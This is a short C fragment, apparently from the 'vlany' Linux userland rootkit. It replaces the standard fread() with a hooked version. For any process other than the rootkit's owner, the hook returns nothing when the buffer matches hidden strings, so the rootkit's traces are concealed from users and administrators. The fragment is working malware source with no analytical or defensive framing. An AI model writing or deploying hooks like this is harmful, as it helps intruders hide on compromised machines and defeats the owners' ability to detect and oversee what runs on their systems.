size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream)
{
    #ifdef DEBUG
        printf("[vlany] fread() called\n");
    #endif

    HOOK(old_fread, CFREAD);

    if(owned()) return old_fread(ptr, size, nmemb, stream);

    if(hidden_str(ptr)) return 0;

    return old_fread(ptr, size, nmemb, stream);
}
